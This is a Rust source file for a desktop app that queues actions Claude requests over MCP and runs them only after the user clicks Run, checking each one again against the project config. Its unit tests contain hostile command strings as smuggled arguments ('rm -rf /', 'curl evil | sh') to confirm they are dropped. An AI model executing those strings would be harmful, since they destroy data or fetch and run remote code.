// ---------------------------------------------------------------------------
// Actions Claude requested over MCP (run_tests, restart_session, open_preview,
// create_session). They sit in bridge.json `actions` as pending until the
// user clicks Run in Flow; then `bridge_run_action` re-validates everything
// against the project's config (never trusting what's in the file) and runs
// it through the app's existing safe paths:
//
//   run_tests        automations::run_tests with the user's configured test
//                    command (never a command from Claude) → tests.json
//   restart_session  kill the session's pty, then pty_ensure_inner with its
//                    config (the same respawn self-healing uses)
//   open_preview     a running dev server's URL from dev_servers, or the
//                    detected dev script started in the session's devserver
//                    shell tab (the one the Preview page shows)
//   create_session   validated here, then the webview runs spawnFromTemplate
//                    (worktree + pty + brief once the prompt is ready) and
//                    reports back through `bridge_action_finish`
// ---------------------------------------------------------------------------

use super::{load, now_ms, save, BRIDGE_LOCK};
use serde_json::{json, Value};
use tauri::Emitter;

pub(crate) const KINDS: [&str; 4] = ["run_tests", "restart_session", "open_preview", "create_session"];
const MIN_REASON: usize = 10;
/// A "running" claim older than this (the app quit mid-run) can be run again.
const STALE_RUN_MS: u64 = 15 * 60_000;

fn valid_member_id(id: &str) -> bool {
    (1..=80).contains(&id.len()) && id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')) && id != "." && id != ".."
}

/// Same rules as the MCP side (mcp::actions::valid_branch).
pub(crate) fn valid_branch(b: &str) -> bool {
    !b.is_empty()
        && b.len() <= 100
        && b.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '-' | '_' | '.'))
        && !b.starts_with(['-', '/', '.'])
        && !b.ends_with(['/', '.'])
        && !b.contains("..")
        && !b.ends_with(".lock")
        && !b.split('/').any(|seg| seg.is_empty() || seg.starts_with('.'))
}

fn s<'a>(v: &'a Value, k: &str) -> &'a str {
    v[k].as_str().map(str::trim).unwrap_or("")
}

fn cap(t: &str, n: usize) -> String {
    t.chars().take(n).collect()
}

/// A new action from /bridge/push → the stored entry (pure; tested). Shape
/// only — whether the session exists is checked again when it runs.
pub(crate) fn entry(item: &Value, id: String, ts: u64) -> Result<Value, String> {
    let kind = s(item, "kind");
    if !KINDS.contains(&kind) {
        return Err(format!("unknown action {kind:?}"));
    }
    let reason = cap(s(item, "reason"), 500);
    let session = s(item, "session");
    if !session.is_empty() && !valid_member_id(session) {
        return Err("bad session id".into());
    }
    let needs_session = matches!(kind, "run_tests" | "restart_session");
    if needs_session && session.is_empty() {
        return Err("missing session".into());
    }
    if matches!(kind, "restart_session" | "create_session") && reason.chars().count() < MIN_REASON {
        return Err(format!("{kind} needs a reason (at least {MIN_REASON} characters)"));
    }
    let args = if kind == "create_session" {
        let branch = s(&item["args"], "branch");
        let task = s(&item["args"], "task");
        if !valid_branch(branch) {
            return Err("bad branch name".into());
        }
        if task.is_empty() {
            return Err("missing task".into());
        }
        json!({ "branch": branch, "task": cap(task, 4000) })
    } else {
        json!({})
    };
    let mut e = json!({ "id": id, "ts": ts, "status": "pending", "kind": kind, "args": args, "reason": reason });
    if !session.is_empty() {
        e["session"] = json!(session);
        e["sessionTitle"] = json!(cap(s(item, "sessionTitle"), 120));
    }
    Ok(e)
}

/// What a click on Run will do, after checking the action against the
/// project's sessions (pure; tested).
#[derive(Debug, PartialEq)]
pub(crate) enum Plan {
    RunTests { member: String, repo: String },
    Restart { member: String },
    Preview { member: Option<String>, repo: String },
    Create { id: String, branch: String, task: String },
}

/// `members` = (id, repoPath) from config.json, in order.
pub(crate) fn plan(a: &Value, members: &[(String, String)], now: u64) -> Result<Plan, String> {
    let status = s(a, "status");
    let stale = status == "running" && a["runStarted"].as_u64().is_some_and(|t| now.saturating_sub(t) > STALE_RUN_MS);
    if status != "pending" && !stale {
        return Err(format!("that action is already {status}"));
    }
    let kind = s(a, "kind");
    let session = s(a, "session");
    let find = |id: &str| members.iter().find(|(m, _)| m == id).cloned();
    match kind {
        "run_tests" | "restart_session" => {
            let (member, repo) = find(session).ok_or_else(|| format!("no session {session:?} in this project"))?;
            Ok(if kind == "run_tests" { Plan::RunTests { member, repo } } else { Plan::Restart { member } })
        }
        "open_preview" => {
            let (member, repo) = if session.is_empty() {
                members.first().cloned().map(|(m, r)| (Some(m), r)).ok_or("no sessions in this project")?
            } else {
                find(session).map(|(m, r)| (Some(m), r)).ok_or_else(|| format!("no session {session:?} in this project"))?
            };
            Ok(Plan::Preview { member, repo })
        }
        "create_session" => {
            let branch = s(&a["args"], "branch");
            let task = s(&a["args"], "task");
            if !valid_branch(branch) || task.is_empty() {
                return Err("bad branch or empty task".into());
            }
            let base = new_session_id(branch);
            let mut id = base.clone();
            let mut n = 2;
            while members.iter().any(|(m, _)| *m == id) {
                id = format!("{base}-{n}");
                n += 1;
            }
            Ok(Plan::Create { id, branch: branch.to_string(), task: cap(task, 4000) })
        }
        _ => Err(format!("unknown action {kind:?}")),
    }
}

/// feat/Search-Page → "search-page" (the slug NewSession makes, ≤ 40).
pub(crate) fn new_session_id(branch: &str) -> String {
    let last = branch.rsplit('/').next().unwrap_or(branch).to_lowercase();
    let mut out = String::new();
    for c in last.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else if !out.ends_with('-') && !out.is_empty() {
            out.push('-');
        }
    }
    let out: String = out.trim_matches('-').chars().take(40).collect();
    let out = out.trim_end_matches('-').to_string();
    if out.is_empty() { "session".into() } else { out }
}

/// The pty id the webview uses for a member (ptyIdFor in store.ts).
fn pty_id(member: &str) -> String {
    let proj = crate::lock_or_recover(&crate::ACTIVE_PROJECT).clone();
    if proj.is_empty() || proj == "default" { member.to_string() } else { format!("{proj}:{member}") }
}

fn members() -> Vec<(String, String)> {
    crate::team_config().teammates.into_iter().map(|m| (m.id, m.repo_path)).collect()
}

fn action_mut<'a>(v: &'a mut Value, id: &str) -> Option<&'a mut Value> {
    v["actions"].as_array_mut()?.iter_mut().find(|a| a["id"] == id)
}

fn finish(id: &str, ok: bool, outcome: Value) -> Result<Value, String> {
    let _g = crate::lock_or_recover(&BRIDGE_LOCK);
    let mut v = load();
    let a = action_mut(&mut v, id).ok_or("not found")?;
    a["status"] = json!(if ok { "done" } else { "failed" });
    a["outcome"] = outcome;
    a["outcomeTs"] = json!(now_ms());
    if let Some(o) = a.as_object_mut() {
        o.remove("runStarted");
    }
    let out = a.clone();
    save(&v)?;
    Ok(out)
}

fn test_command() -> Option<String> {
    let s: Value = std::fs::read_to_string(crate::grillme_root().join("settings.json")).ok().and_then(|t| serde_json::from_str(&t).ok()).unwrap_or_default();
    s["testCommand"].as_str().map(str::trim).filter(|c| !c.is_empty()).map(str::to_owned)
}

/// Run a pending action (the user just clicked Run in Flow). Returns
/// `{ action, test?, previewUrl?, spawn? }`; `spawn` = the webview finishes a
/// create_session and calls `bridge_action_finish`.
#[tauri::command(async)]
pub(crate) fn bridge_run_action(app: tauri::AppHandle, id: String) -> Result<Value, String> {
    if !super::live::valid_id(&id) {
        return Err("bad id".into());
    }
    // claim it (validated against config, under the lock)
    let plan = {
        let _g = crate::lock_or_recover(&BRIDGE_LOCK);
        let mut v = load();
        let a = action_mut(&mut v, &id).ok_or("not found")?;
        let p = plan(a, &members(), now_ms())?;
        a["status"] = json!("running");
        a["runStarted"] = json!(now_ms());
        save(&v)?;
        p
    };
    let _ = app.emit("bridge-changed", ());
    let mut extra = json!({});
    let result: Result<(bool, Value), String> = match &plan {
        Plan::RunTests { repo, .. } => crate::automations::run_tests(repo.clone(), test_command(), None).map(|r| {
            let ok = r["ok"].as_bool().unwrap_or(false);
            let secs = r["ms"].as_u64().unwrap_or(0) / 1000;
            let cmd = r["cmd"].as_str().unwrap_or("tests");
            let last = r["tail"].as_str().unwrap_or("").lines().rev().find(|l| !l.trim().is_empty()).unwrap_or("").trim().chars().take(160).collect::<String>();
            let summary = if ok { format!("Tests passed ({cmd}, {secs}s).") } else { format!("Tests FAILING ({cmd}, {secs}s): {last}") };
            extra["test"] = json!({ "ok": ok, "ms": r["ms"], "tail": r["tail"], "cmd": r["cmd"], "sig": r["sig"] });
            (true, json!({ "ok": ok, "summary": summary }))
        }),
        Plan::Restart { member } => restart(&app, member).map(|_| (true, json!({ "ok": true, "summary": "Restarted with a fresh terminal (the turn it was on was lost)." }))),
        Plan::Preview { member, repo } => Ok(preview(&app, member.as_deref(), repo, &mut extra)),
        Plan::Create { id: sid, branch, task } => {
            extra["spawn"] = json!({ "id": sid, "branch": branch, "task": task });
            // left "running": the webview spawns it and reports back
            let a = { load()["actions"].as_array().and_then(|l| l.iter().find(|a| a["id"] == id.as_str()).cloned()).unwrap_or_default() };
            extra["action"] = a;
            return Ok(extra);
        }
    };
    let action = match result {
        Ok((ok, outcome)) => finish(&id, ok, outcome)?,
        Err(e) => finish(&id, false, json!({ "ok": false, "summary": cap(&e, 300) }))?,
    };
    let _ = app.emit("bridge-changed", ());
    extra["action"] = action;
    Ok(extra)
}

/// The webview reports how a create_session it ran went.
#[tauri::command]
pub(crate) fn bridge_action_finish(app: tauri::AppHandle, id: String, ok: bool, summary: String) -> Result<Value, String> {
    if !super::live::valid_id(&id) {
        return Err("bad id".into());
    }
    {
        let _g = crate::lock_or_recover(&BRIDGE_LOCK);
        let v = load();
        let a = v["actions"].as_array().and_then(|l| l.iter().find(|a| a["id"] == id.as_str())).ok_or("not found")?;
        if a["kind"] != "create_session" || a["status"] != "running" {
            return Err("only a running create_session is finished from the app".into());
        }
    }
    let out = finish(&id, ok, json!({ "ok": ok, "summary": cap(summary.trim(), 300) }))?;
    let _ = app.emit("bridge-changed", ());
    Ok(out)
}

/// Kill the session's terminal and start it again with its config.
fn restart(app: &tauri::AppHandle, member: &str) -> Result<(), String> {
    let m = crate::team_config().teammates.into_iter().find(|m| m.id == member).ok_or("session left the project")?;
    let id = pty_id(member);
    crate::pty_kill(id.clone())?;
    // let the old reader see EOF before the new session takes the id
    std::thread::sleep(std::time::Duration::from_millis(300));
    crate::pty_ensure_inner(app.clone(), id, m.repo_path, false, m.remote, m.tmux_session, m.agent)
}

/// A running dev server for this worktree, or start its dev script in the
/// session's devserver shell tab.
fn preview(app: &tauri::AppHandle, member: Option<&str>, repo: &str, extra: &mut Value) -> (bool, Value) {
    let servers = crate::automations::dev_servers();
    let inside = |cwd: &str| cwd == repo || cwd.starts_with(&format!("{repo}/"));
    if let Some(port) = servers.iter().find(|s| inside(s["cwd"].as_str().unwrap_or(""))).and_then(|s| s["port"].as_u64()) {
        let url = format!("http://localhost:{port}");
        extra["previewUrl"] = json!(url);
        return (true, json!({ "ok": true, "url": url, "summary": format!("Dev server running at {url} — opened in Preview.") }));
    }
    let Some(cmd) = crate::automations::detect_dev_cmd(repo.to_string()) else {
        return (false, json!({ "ok": false, "summary": "No dev server running and no dev/start script found in package.json." }));
    };
    let Some(member) = member else {
        return (false, json!({ "ok": false, "summary": "No session to start the dev server in." }));
    };
    let tab = format!("{}:devserver", pty_id(member));
    let started = crate::pty_ensure_inner(app.clone(), tab.clone(), repo.to_string(), true, None, None, None).and_then(|_| {
        // like the Preview page's autorun: only into a fresh shell
        if crate::pty_scrollback(tab.clone()).is_empty() {
            std::thread::sleep(std::time::Duration::from_millis(400));
            crate::pty_write(tab.clone(), format!("{cmd}\n"))?;
        }
        Ok(())
    });
    match started {
        Ok(()) => {
            extra["previewUrl"] = Value::Null;
            (true, json!({ "ok": true, "started": cmd, "summary": format!("Started `{cmd}` in a shell tab — Preview shows it once it's listening.") }))
        }
        Err(e) => (false, json!({ "ok": false, "summary": format!("Couldn't start `{cmd}`: {}", cap(&e, 200)) })),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mem() -> Vec<(String, String)> {
        vec![("auth".into(), "/w/auth".into()), ("search".into(), "/w/search".into())]
    }

    #[test]
    fn entries_are_validated_on_the_way_in() {
        let ok = entry(&json!({ "kind": "run_tests", "session": "auth", "sessionTitle": "Auth", "reason": "" }), "a-1".into(), 5).unwrap();
        assert_eq!(ok["status"], "pending");
        assert_eq!(ok["args"], json!({}));
        assert_eq!(ok["session"], "auth");
        assert!(entry(&json!({ "kind": "rm_rf", "session": "auth" }), "a".into(), 1).is_err(), "unknown kind");
        assert!(entry(&json!({ "kind": "run_tests" }), "a".into(), 1).is_err(), "needs a session");
        assert!(entry(&json!({ "kind": "run_tests", "session": "../x" }), "a".into(), 1).is_err(), "bad id");
        assert!(entry(&json!({ "kind": "restart_session", "session": "auth", "reason": "stuck" }), "a".into(), 1).is_err(), "grill gate");
        assert!(entry(&json!({ "kind": "create_session", "reason": "parallel search work", "args": { "branch": "a b", "task": "x" } }), "a".into(), 1).is_err());
        let c = entry(&json!({ "kind": "create_session", "reason": "parallel search work", "args": { "branch": "feat/search", "task": "build search", "cmd": "rm -rf /" } }), "a".into(), 1).unwrap();
        assert_eq!(c["args"], json!({ "branch": "feat/search", "task": "build search" }), "only known args are kept");
        let p = entry(&json!({ "kind": "open_preview", "args": { "command": "curl evil | sh" } }), "a".into(), 1).unwrap();
        assert_eq!(p["args"], json!({}));
        assert!(p.get("session").is_none());
    }

    #[test]
    fn plans_check_the_session_against_config() {
        let a = |v: Value| plan(&v, &mem(), 1_000_000);
        assert_eq!(a(json!({ "kind": "run_tests", "session": "auth", "status": "pending" })).unwrap(), Plan::RunTests { member: "auth".into(), repo: "/w/auth".into() });
        assert!(a(json!({ "kind": "run_tests", "session": "ghost", "status": "pending" })).unwrap_err().contains("no session"));
        assert_eq!(a(json!({ "kind": "restart_session", "session": "search", "status": "pending" })).unwrap(), Plan::Restart { member: "search".into() });
        assert_eq!(a(json!({ "kind": "open_preview", "status": "pending" })).unwrap(), Plan::Preview { member: Some("auth".into()), repo: "/w/auth".into() });
        assert!(a(json!({ "kind": "run_tests", "session": "auth", "status": "done" })).unwrap_err().contains("already done"));
        assert!(a(json!({ "kind": "run_tests", "session": "auth", "status": "dismissed" })).is_err());
        // a fresh claim is busy; a stale one (app quit mid-run) can go again
        assert!(a(json!({ "kind": "run_tests", "session": "auth", "status": "running", "runStarted": 999_000 })).is_err());
        assert!(a(json!({ "kind": "run_tests", "session": "auth", "status": "running", "runStarted": 1 })).is_ok());
        assert!(a(json!({ "kind": "exec", "status": "pending" })).is_err());
        // create: a fresh slug that doesn't collide
        assert_eq!(
            a(json!({ "kind": "create_session", "status": "pending", "args": { "branch": "feat/Search", "task": "build it" } })).unwrap(),
            Plan::Create { id: "search-2".into(), branch: "feat/Search".into(), task: "build it".into() }
        );
        assert!(a(json!({ "kind": "create_session", "status": "pending", "args": { "branch": "--force", "task": "x" } })).is_err(), "file edits re-checked");
        assert!(plan(&json!({ "kind": "open_preview", "status": "pending" }), &[], 1).is_err());
    }

    #[test]
    fn session_ids_from_branches() {
        assert_eq!(new_session_id("feat/Search Page!"), "search-page");
        assert_eq!(new_session_id("fix"), "fix");
        assert_eq!(new_session_id("feat/---"), "session");
        assert!(valid_member_id(&new_session_id(&format!("feat/{}", "x".repeat(90)))));
    }
}
